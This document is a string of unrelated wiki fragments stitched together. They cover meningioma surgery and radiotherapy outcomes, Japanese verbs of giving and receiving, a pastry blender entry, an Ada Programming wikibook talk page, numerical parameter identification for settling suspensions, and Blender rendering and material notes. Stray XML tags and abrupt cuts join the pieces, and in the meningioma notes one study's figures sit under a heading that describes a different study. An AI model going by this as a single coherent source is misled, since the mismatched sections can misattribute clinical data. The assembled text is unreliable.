**Outcome: 67% no growth (average F/U 2.4 years, max 6 years); 22% tumor growth (2.4 mm per year, range 2 mm - 1 cm) 
**Conclusion: Need for close follow-up to rule out rapidly enlarging tumors

==Surgical Management==
*Frequently considered for symptomatic patients, younger patients, and patients with expanding/infiltrating tumors
*Complications: range 2-30% depending on location and type
*Mortality: range 1-14%; worse in elderly
*Resectability plays an important role:
**Completeness of resection - '''Simpson Grade''' PMID 13406590 - predicts for likelihood of local recurrence
**Gross total resection (Grade I-III) in ~80%, leading to 10-year PFS of ~80%
**Subtotal resection typically in cavernous sinus, petroclival region, posterior superior sagittal sinus, and optic nerve sheath tumors; have 4.2x relative excess death risk compared to complete resection
{| border=&quot;1&quot; 
! Simpson Grade !! Completeness of Resection !! 10-year Recurrence
|- 
| Grade I || complete removal including resection of underlying bone and associated dura || align=&quot;center&quot; | 9%
|-
| Grade II || complete removal + coagulation of dural attachment || align=&quot;center&quot; |  19%
|-
| Grade III || complete removal w/o resection of dura or coagulation || align=&quot;center&quot; |  29%
|-
| Grade IV || subtotal resection || align=&quot;center&quot; |  40%

==Adjuvant Radiation==
*'''Germany''' (1985-2009) -- Atypical and malignant meningiomas
**62 pts w/ atypical and 23 pts w/ malignant meningiomas, s/p RT (60% after surgical resection, 19% at disease progression, 8% as primary treatment). Average dose 57.6 Gy in 1.8-3 Gy fx. 
**'''2012''' PMID 22137023 -- &quot;Long-term outcome after radiotherapy in patients with atypical and malignant meningiomas--clinical results in 85 patients treated in a single institution leading to optimized guidelines for early radiation therapy.&quot; (Adeberg S, Int J Radiat Oncol Biol Phys. 2012 Jul 1;83(3):859-64.)
***5-yr OS: 81% atypical and 53% malignant. PFS: 95% and 50% (at 2 and 5 yrs) for atypical, and 63% and 13% for malignant.
**Conclusion: &quot;RT resulted in improvement of preexisting clinical symptoms; outcome is comparable to other series reported in the literature.&quot;

*'''France''' (1999-2006) -- Atypical and malignant meningiomas
**19 pts w/ atypical and 5 pts w/ malignant meningiomas, s/p RT. Treatment at Centre de Protontherapie d'Orsay (CPO). Median total RT dose 68 CGE (34 Gy photons + 34 CGE protons).

***Retrospective. 108 atypical meningioma, gross total resection. Adjuvant radiation in 8 patients.
***Outcome: recurrence rate 28%, mean time to recurrence 3 years. No recurrence with the 8 patients who received adjuvant RT. Patients with recurrences underwent RT, and average 2.7 craniotomies/patient. Tumor-related mortality after recurrence 30%
***Conclusion: High recurrence rate for atypical meningiomas after GTR without adjuvant radiation; causing numerous reoperations and shortened survival

      <comment>/* Giving */</comment>
      <text xml:space="preserve">There are several ways to express giving and receiving depending on which side the speaker is on, but also depending on whether someone of higher or lower rank is being addressed.

== Giving ==
[[File:Japanese Verbs of Giving.png|thumb|360px|This schematic illustrates the various verbs for giving and receiving.]]

When expressing that someone '''gives''' to someone else (but not you), use the form of:
{| class=&quot;wikitable&quot;
| valign=&quot;middle&quot; | (Giver) || は&lt;br /&gt;が || (Receiver) に (object) を
| {{furi|差|さ|し}}{{furi|上|あ|げる}}。&lt;br /&gt;
{{furi|上|あ|げる}}。&lt;br /&gt;
やる。&lt;ref&gt;The verb &quot;やる&quot; is rather disrespectful and would only be used by boys joking with each other.&lt;/ref&gt;
|}

When others give you, use either:
{| class=&quot;wikitable&quot;
| valign=&quot;middle&quot; | (Giver) || は&lt;br /&gt;が || (you) に (object) を
| {{furi|下|くだ|さる}}&lt;br /&gt;くれる
|}

{{Japanese example|
: {{furi|私|わたし}}は{{furi|先生|せんせい}}に{{furi|本|ほん}}を{{furi|差|さ|し}}{{furi|上|あ|げます}}。 // I give the teacher the book.
}}
{{Japanese example|
: {{furi|私|わたし}}は{{furi|妹|いもうと}}にお{{furi|菓子|かし}}をあげる。 // I give my sister candy. (plain present)
: {{furi|私達|わたしたち}}は{{furi|猫|ねこ}}にボールをあげた。 // We gave the cat a ball. (plain past)
: {{furi|彼女|かのじょ}}は{{furi|先生|せんせい}}に{{furi|林檎|りんご}}をあげます。 // The girl gives an apple to the teacher. (polite present)
: {{furi|友達|ともだち}}はお{{furi|母|かあ}}さんにカードをあげました。 // My friend gave his mom a card. (polite past)
}}

The polite form is &quot;くださる&quot; while &quot;くれる&quot; is of neutral politeness and most commonly used. You will often use this verb when you've gotten something from someone who isn't currently there.
{{Japanese example|
: {{furi|先生|せんせい}}は{{furi|私|わたし}}に{{furi|本|ほん}}を{{furi|下|くだ|さいました}}。 // The teacher gave me a book.
}}
{{Japanese example|
: あなたは{{furi|私|わたし}}にビデオをくれる。 // I get a video from you.
: {{furi|岸子|きしこ}}は{{furi|私|わたし}}にマンガをくれた。 // I received a manga from kishiko.
}}

== Receiving ==

When expressing that someone '''receives''' from someone else, use a form of:
{| class=&quot;wikitable&quot;
| valign=&quot;middle&quot; | (Receiver) || は&lt;br /&gt;が || (Giver)
| に&lt;br /&gt;から
| (object) を
| {{furi|頂|いただ|く}}&lt;br /&gt;{{furi|貰|もら|う}}.
|}

Although に is slightly more casual, you can use both に and から when you receive some physical objecs. For actions, you can only use に. Use から when you wish to emphasize the giver.

{{Japanese example|
: クリスマスが{{furi|来|き|たら}}、お{{furi|婆|ばあ}}ちゃんに{{furi|新車|しんしゃ}}をもらうと{{furi|思|おも|う}}。 // When Christmas comes, I think I'll get a new car from grandma. (''plain form'')
: {{furi|誕生日|たんじょうび}}に、{{furi|梓|あずさ}}はお{{furi|父|とう}}さんから250,000円をもらったそうです！ // For her birthday, I heard that Azusa received 250,000 yen from her dad! (''polite form'')&lt;ref&gt;In this case, 誕生日に、梓はお父さん&quot;から&quot;～ may be better because you can avoid &quot;に、... に&quot; form&lt;/ref&gt;
: {{furi|彼女|かのじょ}}は{{furi|王子|おうじ}}と{{furi|結婚|けっこん|したら}}、{{furi|女王|じょおう}}に{{furi|多|おお|く}}の{{furi|宝石|ほうせき}}をもらいます。 //  When she marries the prince, she will receive many jewels from the queen. (''polite form'')
: お{{furi|母|かあ}}さんに{{furi|新|あたら|しい}}パソコンをもらいました！ // I got a new computer from my mother! (''polite form'')
}}
The verb いただく is a humble verb, and is used when you receive something from a superior or wish to show respect.

Example:
{{Japanese example|
: {{furi|私|わたし}}は{{furi|先生|せんせい}}にペンをいただきました。 // I received a pen from the teacher.
}}

== Actions ==
When the object being given or received is an action (and thus expressed by a verb) you can attach use it in the て-form in place of the object.
{| class=&quot;wikitable&quot;
| (Giver) は
| rowspan=&quot;2&quot; | (Verb in 〜て form)
| (Verb of giving)。
|-
| (Receiver) に || (Verb of receiving)。
|}
Note that for receiving an action, you cannot use &quot;から&quot;.

Examples for giving, &quot;I washed the car for her,&quot; or, &quot;I did the laundry for him.&quot; Here are some examples in Japanese:

{{Japanese example|
: {{furi|私|わたし}}はアパートの{{furi|掃除|そうじ}}をしてあげました。 // I cleaned the apartment (for him/her). (polite form)
: {{furi|私|わたし}}は{{furi|晩|ばん}}ご{{furi|飯|はん}}を{{furi|作|つく|って}}あげた。 // I made dinner (for him or her). (plain form)
}}
Examples for receiving, &quot;The dentist examined my teeth for me,&quot; or &quot;Mom cleaned up my room for me.&quot; Here are some examples:
{{Japanese example|
: {{furi|医者|いしゃ}}に{{furi|診|み|て}}もらいました。 // The doctor examined me (for me). (''polite form'')
: {{furi|彼氏|かれし}}に{{furi|新|あたら|しい}}{{furi|車|くるま}}を{{furi|買|か|って}}もらった！ // My boyfriend bought a new car for me! (''plain form'')
}}

[[Image:09-crust_blended.jpg|thumb|right|Pastry Blender with blended butter and flour]]

A '''pastry blender''' or '''pastry cutter''' is a device used to cut a solid [[Cookbook:Fat|fat]] (such as [[Cookbook:Butter|butter]], [[Cookbook:Margarine|margarine]], [[Cookbook:Lard|lard]], or [[Cookbook:Shortening|shortening]]) evenly into a dry, usually [[Cookbook:Flour|flour]]-based, mixture. A pastry cutter will typically have four or five blades or stiff wires running parallel, which curve into a handle on both ends creating a &quot;D&quot; shape.

The purpose of a pastry blender is to distribute the fat into the mixture without combining them. When a dough made with this technique is rolled flat, these small pieces of fat are extended to discs in different levels of the dough. When this dough is cooked, the fat forms small pockets which give pastry its delicate and flaky texture.

A pair of butter knives is typically an acceptable substitute for a pastry cutter, though the process may be slower.</text>

== To add ''Ada 95 Quality and Style Guide'' to the ''See also'' section ==

Besides the Reference Manual, it could be interesting that every page references to the ''[http://www.adaic.com/docs/95style/html/cover.html Ada 95 Quality and Style Guide]'' at the [[Talk:Ada Programming/Contributing#See also|See also]] section:

 &lt;nowiki&gt;
 === Ada 95 Quality and Style Guide ===

 * [http://www.adaic.com/docs/95style/html/sec_5/5-5-5.html 5.5.5 Short Circuit Forms of the Logical Operators]
 * [http://www.adaic.com/docs/95style/html/sec_10/10-5-2.html 10.5.2 Short-Circuit Operators]
 &lt;/nowiki&gt;

Also, why make links to the &quot;plain&quot; [http://www.adaic.org/standards/95lrm/html/RM-TOC.html Reference Manual] and not to the [http://www.adaic.org/standards/95aarm/html/AA-TOC.html Anotated one]?

--[[User:Suruena|suruena]] 14:47, 10 Mar 2005 (UTC)

: I agree about the Style Guide. The rationale is also a good source of information. Maybe we should look for a more compact layout for these external references if we end linking to all of them. About the anotated manual, I'm not sure, usually the annotations are aimed to compiler developers more than to the Ada programmer, aren't they? [[User:ManuelGR|ManuelGR]] 12:53, 12 Mar 2005 (UTC)

: I agree about the Style Guide. I don't think the AARM is good for a tutorial. --[[User:Krischik|Krischik]] 15:57, 12 Mar 2005 (UTC)

:: Well, the RM is not very good for a tutorial neither :-) -- [[User:Suruena|suruena]] 11:40, 19 Mar 2005 (UTC)

=== No '95 ===

Hello again. I propose to change the title of that section to &quot;Ada Quality and Style Guide&quot; (and not &quot;Ada '''95''' Quality and Style Guide&quot;). Maybe in the future there will be a new style guide for Ada 2005 (I hope so, but I don't know about any plan to make that effort), but the main reason is because that title looks like &quot;old&quot;. If you are agree I can make all the changes. Best regards. --[[User:Suruena|surueña]] 10:54, July 22, 2005 (UTC)

:I agree with you, surueña. It would look a bit old when Ada 2005 is published. In the case that a new guide is published we will change the &quot;current style guide&quot; templates ([[Template:Ada/SG1]], etc) to the new one, otherwise all the information present is still applicable for Ada 2005. [[User:ManuelGR|ManuelGR]] 13:46, 24 July 2005 (UTC)

:Sure, lets change it. --[[User:Krischik|Krischik]] 14:53, 24 July 2005 (UTC)

::OK, I'm working on it --[[User:Suruena|surueña]] 19:57, July 25, 2005 (UTC)

== Templates ==

Templates are very powerful. Until now I've created two of them:
* [[Template:Ada/Keywords]]
* [[Template:Adakw]]
The former is a table with references to every keyword, and it is intended to be used in all pages of [[Ada Programming/Keywords]] (but I can't center it!). The latter could be used when a keyword appears, and not only in souce code examples but also if mentioned in a text (but surrounded with &amp;lt;tt&amp;gt;), thus is very, very compact, instead of the first one. I propose to make more templates like this:
&lt;pre&gt;
* Operators:      [[Template:Adaop]]
* Types:          [[Template:Adatype]]
* Attributes      [[Template:Adaatt]]
* Pragmas:        [[Template:Adapragma]]
* Packages:       [[Template:Adapackage]]
* Child Packages: [[Template:Adapackage]]
&lt;/pre&gt;
They are not made yet because I haven't decided a good name. Maybe for keywords and operators that one is OK, but for the others [[Template:Ada-pragma]] is better. Any ideas? -- [[User:Suruena|suruena]] 11:38, 19 Mar 2005 (UTC)

:I prefer separating the words and I think that using [[Template:Ada:pragma]] or [[Template:Ada/pragma]] would be the proper wiki style. I also propose to define a template for the external links to the ARM and the Style Guide so it defends ourselves againts future web changes. For example, see: [[Template:Ada/RM2]] (two chapters deep) which can be instantiated this way:
 &lt;nowiki&gt;{{Ada/RM2|4|4|Expressions}}&lt;/nowiki&gt;
Resulting:
{{Ada/RM2|4|4|Expressions}}
And when Ada 2005 is finished we can change all the links to the new standard easily! [[User:ManuelGR|ManuelGR]] 18:24, 19 Mar 2005 (UTC)

::Any of those two new naming conventions for the templates seems OK to me. You don't say anything, but for keywords I still would use a more compact name. I'm agree that those new templates for external links are very helpful. And I would also add some more templates for presentation purposes (comments, literals...). -- [[User:Suruena|suruena]] 18:44, 19 Mar 2005 (UTC)

:::I agree about adakw template but we can always make a redirect for orthogonallity (let's see: [[Template:Ada/kw]]). I tried making [[Template:Ada]] a parent page for all the Ada/ templates that we would define, but surprisingly the subpages are not linked with it, so I suppose the subpage feature does not work for templates (or it's a cache problem). I intended to insert it in this Contributing page but if it is not working as a parent page for all our templates I'm not sure of its usefulness. [[User:ManuelGR|ManuelGR]] 18:57, 19 Mar 2005 (UTC)
:::[[Template:Ada/kw]] works! A template redirect {{Ada/kw|renames}} a template. [[User:ManuelGR|ManuelGR]] 19:01, 19 Mar 2005 (UTC)


I've added another template: [[Template:Ada/comment]]. This one is a formatting template, putting the text in italics silver font (of course, change the colors/face if you wish). And note that the template puts &quot;-- &quot; in front of the text:

 &lt;nowiki&gt;{{Ada/comment|This is a comment}}&lt;/nowiki&gt;          {{Ada/comment|This is a comment}}

I wanted to make more formatting templates like strings literals or numeric literals, but I think they are not necesary. In my opinion, in the source code examples of the wikibook it's important that keywords are easily identified (bold face) because beginers have to learn them first. Also, comments should be visually distinc because someone could think they are part of the code (after all -- is an very well known operator of C and other common languages). As I said, we could make similar templates for literals and so on, but in my opinion they are more helpful in an IDE than in a book. --[[User:Suruena|suruena]] 21:28, 3 Apr 2005 (UTC)

:I aggree with the new template and all you say. Regarding the colour I probably will change it because it is too light, almost unreadable in my screen, though don't know what colour or gray tone to choose. On the other hand, Ada/-- might be a good alias for the template, isn't it? [[User:ManuelGR|ManuelGR]] 22:53, 3 Apr 2005 (UTC)

::OK, the shortcut [[Template:Ada/--]] added to the [[Talk:Ada Programming/Contributing|contributing page]]. If there are more visualization problems with the current formatting of comments, please feel free to make any change (currently comments are seen OK in my computer). --[[User:Suruena|suruena]] 09:42, 4 Apr 2005 (UTC)

== Headings capitalization ==

Following the [[Wikipedia:Wikipedia:Manual of Style (headings)#Capitalisation|Manual of Style of Wikipedia]], the capitalisation of the sections's headings are the first letter of the first word only, i.e. like a normal sentence. For example:

* '''See also'''
* '''External links'''
* '''The Ada Reference Manual and other documents'''

This isn't only a convention of the Wikipedia, but also is followed in every english book that I've seen. Although note that for the title of a chapter (almost) every word must be capitalised (except definite/indefinite articles). --[[User:Suruena|suruena]] 14:14, 3 Apr 2005 (UTC)

: Well we have different rules here in Germany which might have leaked into Programming:Ada - so just correct it.

== Book of the month ==

How about a run at: [[Wikibooks:Book of the month]] - there are not that many votes so I think we might have chance.

:Yes, let's try. I'm not sure if we can defend the nomination, but a good argument is that ours is the biggest programming book on Wikibooks [http://en.wikipedia.org/wikistats/wikibooks/EN/Wikibooks_EN.htm] (being quality a difficult measure I think we win in that aspect too). The problem may be that people usually prefer less technical books. Would we contest for August or is it a bit late? [[User:ManuelGR|ManuelGR]] 17:02, 25 July 2005 (UTC)

=== November ===

Timing could be tricky indeed - and yes for August it is to late - rather think of November.

--[[User:Krischik|Krischik]] 07:57, 26 July 2005 (UTC)

: Why wait so much? Do you think we should expand more the book or prepare something? [[User:ManuelGR|ManuelGR]] 18:53, 27 July 2005 (UTC)

:: Ups - I wanted to say &quot;Sebtember&quot; for which voting starts on monday.

Voting for September has started so I have nominated Programming:Ada. Please, vote and give publicity to the nomination. [[User:ManuelGR|ManuelGR]] 18:58, 1 August 2005 (UTC)

: I added my vote an a little supporting comment --[[User:Krischik|Krischik]] 07:02, 2 August 2005 (UTC)

== Moving the Standard Libraries ==

In my opinion, there are some advantages in moving the Standard Libraries from the [[Ada Programming/Packages|Packages:]] domain name, to the [[Ada Programming/Libraries|Libraries:]] one:

* The Standard Libraries do not only have packages, but also generic subprograms (like Ada.Unckecked_Conversion), that aren't currently covered in [[Ada Programming/Packages/Ada]] and they should be.
* To be able to use the [[Template:Ada/package]] not only with entities of the Standard Library, but also with packages/subprograms of other libraries, e.g., in demo code, to be able to put &lt;nowiki&gt;{{&lt;/nowiki&gt;Ada/package 2|Gwindows|Databases}} resulting in a link to [[Ada Programming/Libraries/Gwindows.Databases]].
* To leave to &quot;entire&quot; domain [[Ada Programming/Packages|Packages:]] for explaining the concepts of packages (limited, private, ...). Currently alhtough its submodules lists the Standard Libraries the module [[Ada Programming/Packages]] is used to explain the theory behind packages, but it would be more intuitive to list in the parent module all the libraries.
So I think we should:

# Move all the modules about Standard Libraries to the domain name [[Ada Programming/Libraries|Libraries:]] (not a lot of work because many packages haven't got its own module), leaving redirections from the old location to the new one, 
# Modify the [[Template:Ada/package]], [[Template:Ada/package 2]], [[Template:Ada/package 3]] and [[Template:Ada/package 4]] -- and thus working with every library unit (maybe also rename this templates to [[Template:Ada/lib unit]] or something like that because they also cover generic subprograms?).
# Create references to generic subprograms, they are part of the Standard Libraries too. 
Again, if you agree with me I volunteer to do the job, it's easy. --[[User:Suruena|surueña]] 08:10, July 29, 2005 (UTC)

: Fine by me - however I think our priority should be to reduce [[:Category:Ada Programming/Empty module]] --[[User:Krischik|Krischik]] 07:47, 30 July 2005 (UTC)

      <text xml:space="preserve">Even though it is tried to keep this chapter on '''Parameter Identification of Flocculated Suspensions''' as self-comprehensive as possible, preliminar knowledge on [[numerical Methods]] and the [[Sedimentation:Modeling|Modeling of suspensions]] are useful. In particular, the [[Numerical Methods/Equation Solving#Newton-Raphson|Newton-Raphson]] scheme to solve nonlinear systems of equations for the optimization and Finite-Volume-Methods for the solution of [[wikipedia:Partial differential equation|partial differential equations]] are applied.

== Introduction ==
== Modeling of flocculated supensions ==
The batch settling process of flocculated suspensions is modeled as an intitial value problem

&lt;math&gt; 
\frac{\partial u}{\partial t} + \frac{\partial f(u)}{\partial x} 
= \frac{\partial A^2(u)}{\partial x^2}, 
\quad
u(0,x)=u_0(), \quad x \in [0,L]
&lt;/math&gt; 

where
&lt;font style=&quot;vertical-align:-0%;&quot;&gt;&lt;math&gt; u &lt;/math&gt;&lt;/font&gt; 
denotes the volume fraction of the dispersed solids phase.
For the closure, the convective flux function is given by the Kynch batch settling function with Richardson-Zaki hindrance function

&lt;math&gt;
f(u) = \left \{ \begin{matrix}
&amp; u_{\infty} u (1-u)^C &amp; \mbox{for } 0 \le u &lt; u_{\max} \\
&amp; 0 &amp; \mbox{for } u \le 0 \mbox{ and } u \ge u_{\max} 
\end{matrix} \right.
&lt;/math&gt; 

and the diffusive flux is given by 

&lt;math&gt;
  A(u)=\int_0^{u} a(s) ds, \quad
  a(u)= a_0 (1-u)^C u^{k-1} ,
&lt;/math&gt; 

which results from the insertion of the power law 

&lt;math&gt;
\sigma_{\mathrm{e}}(u) = \left \{ \begin{matrix}
\sigma_0 \left ( \left ( \frac{u}{u_{\mathrm{c}}} \right )^k - 1    \right )  &amp; \mbox{for } u_{\mathrm{c}}&lt; u \\
0 &amp; \mbox{for } u \le u_{\mathrm{c}}
\end{matrix} \right.
&lt;/math&gt; 

into

&lt;math&gt;
  a(u)= \frac{f(u) \sigma_{\mathrm{e}}'(u)}{\Delta \varrho g u}, \quad
  a_0=\frac{u_\infty \sigma_0 k }{\Delta \varrho g u_{\mathrm{c}}^k} .
&lt;/math&gt; 

In the closure, the constants
&lt;font style=&quot;vertical-align:-0%;&quot;&gt;&lt;math&gt; u_{\infty}, C, a_0, u_{\max}, k &lt;/math&gt;&lt;/font&gt; 
are partly known.

== Numerical scheme ==
The numerical scheme for the solution of the direct problem is written in conservative form as a marching formula for the interior points (&quot;interior scheme&quot;) as
&lt;math&gt;
u_j^{n+1}=u_j^n - \frac{\Delta t}{\Delta x} \left ( f_{j+1/2}^{n+1} -  f_{j-1/2}^{n+1} \right )
+ \frac{\Delta t}{\Delta x^2} \left ( A(u_{j-1}^{n+1})  - 2 A(u_{j}^{n+1}) + A(u_{j+1}^{n+1}) \right ),
\quad j = 2, \dots, J-1 
&lt;/math&gt; 

and at the bondaries (&quot;boundary scheme&quot;) as

&lt;math&gt;
u_1^{n+1}=u_1^n - \frac{\Delta t}{\Delta x} f_{j+1/2}^{n+1} + \frac{\Delta t}{\Delta x^2} \left ( A(u_{j+1}^{n+1})  - A(u_{j}^{n+1}) \right ), \quad 
u_J^{n+1}=u_J^n + \frac{\Delta t}{\Delta x} f_{J-1/2}^{n+1} - \frac{\Delta t}{\Delta x^2} \left ( A(u_{J}^{n+1})  - A(u_{J-1}^{n+1}) \right )
&lt;/math&gt; 

For a first-order scheme, the numerical flux function becomes

&lt;math&gt;
f_{j+1/2}^{n} = f(u_{j}^n, u_{j+1}^n) .
&lt;/math&gt; 
If the flux function has one single maximum, denoted by

&lt;font style=&quot;vertical-align:-0%;&quot;&gt;&lt;math&gt; u_{\mathrm{m}} &lt;/math&gt;&lt;/font&gt;, 
the Engquist-Osher numerical flux function can be stated as

&lt;math&gt;
f^{\mathrm{EO}}(u,v) = \left \{ \begin{matrix} 
&amp; f(u), &amp; \mbox{for } u \le u_{\mathrm{m}}, v \le u_{\mathrm{m}}, \\
&amp; f(u)+f(v)-f(u_{\mathrm{m}}), &amp; \mbox{for } u \le u_{\mathrm{m}}, v &gt; u_{\mathrm{m}}, \\
&amp; f(u_{\mathrm{m}}), &amp; \mbox{for } u &gt; u_{\mathrm{m}}, v \le u_{\mathrm{m}}, \\
&amp; f(v), &amp; \mbox{for } u &gt; u_{\mathrm{m}}, v &gt; u_{\mathrm{m}} .
\end{matrix} \right.
&lt;/math&gt; 

For linearization, the [[Wikipedia:Taylor series|Taylor]] formulae 

&lt;math&gt;
f(u_j^{n+1}, u_{j+1}^{n+1}) = f(u_j^n, u_{j+1}^{n}) 
+  \frac{\partial f(u_{j}^n, u_{j+1})}{ \partial u_j^n } (u_j^{n+1} - u_j^{n})
+  \frac{\partial f(u_{j}^n, u_{j+1})}{ \partial u_{j+1}^n } (u_{j+1}^{n+1} - u_{j+1}^{n}), \quad j = 1, \dots, J
&lt;/math&gt; 

and

&lt;math&gt;
A(u_j^{n+1}) = A(u_j^n) 
+  \frac{\partial A(u_{j}^n)}{ \partial u_j^n } (u_j^{n+1} - u_j^{n}), \quad j = 1, \dots, J
&lt;/math&gt; 

are inserted.
&lt;!-- 
where 
&lt;font style=&quot;vertical-align:-0%;&quot;&gt;&lt;math&gt; \mathcal{J}_{\mathrm{f}} &lt;/math&gt;&lt;/font&gt; 
is the Jacobian of the flux function.
--&gt;
&lt;!-- Collecting convective and diffusive fluxes as
&lt;math&gt;
\tilde{f}_{j+1/2} = f_{j+1/2} + \left ( A(u_{j+1})-A(u_j) \right ) / \Delta x
&lt;/math&gt; 
--&gt;
Abbreviating the time evolution step as

&lt;math&gt; \Delta u_j^n = u_j^{n+1} - u_j^n, \quad j = 1, \dots, J, &lt;/math&gt; 

the linearized marching formula for the interior scheme becomes

&lt;math&gt;
\Delta u_j^n = - \frac{\Delta t}{\Delta x} 
\left ( f_{j+1/2}^n + \mathcal{J}_{j+1/2}^- \Delta u_j^n 
+ \mathcal{J}_{j+1/2}^+ \Delta u_{j+1}^n 
+ f_{j-1/2}^n + \mathcal{J}_{j-1/2}^- \Delta u_{j-1}^n 
+ \mathcal{J}_{j-1/2}^+ \Delta u_j^n \right ) 
&lt;/math&gt;
&lt;math&gt;
+\frac{\Delta t}{\Delta x^2} 
\left ( A(u_{j-1}) - 2A(u_j) + A(u_{j+1}) + a(u_{j-1}) \Delta u_{j-1} -2 a(u_j) \Delta u_j + a(u_{j+1}) \Delta u_{j+1} 
\right ) , 
&lt;/math&gt;

where 

&lt;math&gt; 
J_{j+1/2}^+ = \frac{\partial f(u_j^n, u_{j+1}^n)}{\partial u_{j+1}^n}, \quad 
J_{j+1/2}^- = \frac{\partial f(u_j^n, u_{j+1}^n)}{\partial u_{j}^n} . 
&lt;/math&gt; 

Rearrangement leads to a block-triangular linear system 

&lt;math&gt;

\left( \frac{\Delta t}{\Delta x} ( \mathcal{J}_{j-1/2}^- + \frac{\Delta t}{\Delta x^2} a(u_{j-1}^n) \right ) \Delta u_{j-1}^n 
+ 
\left( I +\frac{\Delta t}{\Delta x} \left ( \mathcal{J}_{j+1/2}^- - \mathcal{J}_{j-1/2}^+ \right) + \frac{2 \Delta t}{\Delta x^2} a(u_j^n) \right) \Delta u_j^n 
&lt;/math&gt; &lt;math&gt;
+ 
\left( \frac{\Delta t}{\Delta x} \mathcal{J}_{j+1/2}^+ - \frac{\Delta t}{\Delta x^2} a(u_{j+1}^n) \right ) \Delta u_{j+1}^n 
&lt;/math&gt; &lt;math&gt;
= 
\frac{\Delta t}{\Delta x} \left ( f(u_j^n, u_{j+1}^n) - f(u_{j-1}^n,u_j^n)\right ) 
- \frac{\Delta t}{\Delta x^2} \left ( A(u_{j-1}^n) - 2 A(u_j^n) + A(u_{j+1}^n) \right ) , j=2,\dots,J-2
&lt;/math&gt; 

which is of the form

&lt;math&gt;
  m_{j,j-1} \Delta u_{j-1}^n + m_{j,j} \Delta u_j^n + m_{j,j+1} \Delta u_{j+1} = b_j ,
&lt;/math&gt; 

or, in more compact notation,

&lt;math&gt;
M \Delta u^n = b, \quad
\begin{bmatrix} m_{11} &amp; m_{12} &amp; 0 &amp; \cdots &amp; \cdots &amp; \cdots &amp; \cdots &amp; 0 \\ 
m_{21} &amp; m_{22} &amp; m_{23} &amp; 0 &amp; \cdots &amp; \cdots &amp; \cdots &amp; 0 \\
\vdots &amp; &amp; &amp; &amp;   &amp; &amp; &amp; \vdots \\
\vdots &amp; &amp; &amp; &amp;   &amp; &amp; \ddots &amp; \vdots \\
0 &amp; \cdots &amp; \cdots &amp; \cdots &amp; \cdots &amp; 0 &amp;  m_{J,J-1} &amp; m_{J,J}
\end{bmatrix} , 
\quad 
b= \begin{bmatrix} b_1 \\ \vdots \\ b_J \end{bmatrix} , 
\quad 
\Delta u^n = \begin{bmatrix} \Delta u_1^n \\ \vdots \\ \Delta u_J^n \end{bmatrix} . 
&lt;/math&gt; 


== Parameter identification as Optimization ==

The goal of the parameter identification by optimization is to minimize the cost function over the parameter space

&lt;math&gt; \min_e q(e), \quad q(e) = \| h(e) - H \|^2 &lt;/math&gt;,

where h(e) denotes the interface that is computed by simulations and H is the measured interface.
Without loss of generality we consider a parameter set e=(e_1, e_2) consiting of two parameters.
The optimization can be iteratively done by employing the Newton method as

&lt;math&gt;Q(e_k) \Delta e_k = \nabla_e q(e_k),
\quad 
e \subset \{ C, v_{\infty}, a_0, u_{\mathrm{c}}, k \} ,
&lt;/math&gt;

where 

&lt;math&gt;
Q = 
\begin{bmatrix} 
  \frac{\partial^2 q}{\partial e_1^2} &amp; \frac{\partial^2 q}{\partial e_1 e_2} \\
  \frac{\partial^2 q}{\partial e_2 e_1} &amp; \frac{\partial^2 q}{\partial e_2^2}
\end{bmatrix} , 
&lt;/math&gt; 

is the Hessian of q. The Newton method is motivated by the Taylor expansion

&lt;math&gt; 
0 \approx Q(e^*) = Q(e) + \nabla_e Q(e) \Delta e + \frac{1}{2} \Delta e^{\mathrm{T}} Q \Delta e, 
\quad
\Delta e = e^* - e,
&lt;/math&gt;

where &lt;math&gt;e^*&lt;/math&gt; is the optimal parameter choice.

'''Render Layers'''

The output of the rendering process is generally a single image frame (which might be part of a sequence of images). However, instead of directly rendering all the elements of the scene into the output image, you may want to apply different effects to different parts.

To this end, it is possible to split out the elements of the rendering process (separate scene layers, also solid versus halo materials, Z-depth, sky background etc) into separate ''render layers'' which can then be fed into the '''[[Blender_3D:_Noob_to_Pro/Compositing|compositor]]''' and tweaked in various ways to make up the final image.

'''Rendering by Parts (Bucket Rendering)'''

Images can be rendered in pieces or layers rather than all at one time. Your computer will only need to compute smaller bits of information thus using less memory. By changing the Xpart and Ypart values (up to 8 each since Blender can't support more than 64 [8x8] parts) in the Render panel of the Scene context(F10,) you can divide your image into an invisible grid. The pieces will layer one at a time until they are whole.

'''Edge Renderings''' - [http://forum.nystic.com/viewtopic.php?f=34&amp;t=3102 Tutorial Here]

Blender has an option of adding a border – a defined edge to objects (like in cartoons). To do that you need to go to the render buttons (F10) and then, under &quot;output&quot; change the edge setting: set the &quot;Eint&quot; to a value of about 100 and check the &quot;edge&quot; icon to enable edge rendering. This would give you edge line at the edge of each polygon.
To prevent it from applying on all polygons the same way change to &quot;unified render&quot; under the format tab. Then, in the edge settings change the &quot;antishift&quot; value, it will decrease itself from the fint value when the line is between identical materials. By also checking the &quot;all&quot; icon you tell the render to apply the edge rendering on transparent materials as well.
In Blender 2.59 this seems to be integrated into the Render-properties in the subwindow 'Post Processing' as options 'Edge' and 'Threshold'. 

Note: User Terrywallwork - The edge bordering feature in Blender 2.43 only seems to work when Blender Internal renderer is used, when Yafray is used, no edge is show even if the options is clicked.  I'm not sure if there is a way round this or not. 

HDRI Rendering - [http://forum.nystic.com/viewtopic.php?f=9&amp;t=5355 Tutorial Here]

'''Multi Thread Rendering'''

Blender has the option to render with 'Multiple threads' meaning it can render more than 1 part at once. This is done by sending more than 1 Render parts to the CPU to process at the same time, if your CPU can handle it. The Option is found in render buttons (F10). Change the number of threads used by changing its number.

'''Note in Blender 2.46+''': Blender 2.46 automatically selects the number of threads.

{{B3D:N2P/ForVersion|2.57}}

In 3D graphics, materials and textures are nearly as important as shapes. Scenes would be boring if all the objects were gray.

The {{B3D:N2P/FirstUse|material system}} in Blender allows you to model a wide variety of materials and how they interact with light.  The next few modules will introduce the available options.

{{B3D:N2P/Note|'''Note that material and texture settings are renderer-specific.''' This page and the following ones describe settings appropriate to the '''Blender Internal''' renderer, which is the one selected by default when you open a new Blender document. Other renderers (both built into Blender and external) are available; you will learn about these later, in [[../Advanced_Tutorials/Advanced_Rendering|Advanced Rendering]].}}

== Material versus Texture ==
A {{B3D:N2P/FirstUse|material}} defines the optical properties of an object: its color and whether it is dull or shiny.  A {{B3D:N2P/FirstUse|texture}} is a pattern that breaks up the uniform appearance of the material.  Very few objects in the real world have completely uniform surfaces.  Instead most of them have patterning or variation in color: consider the grain in a piece of wood or the pile in a carpet or the mortar in a brick wall.

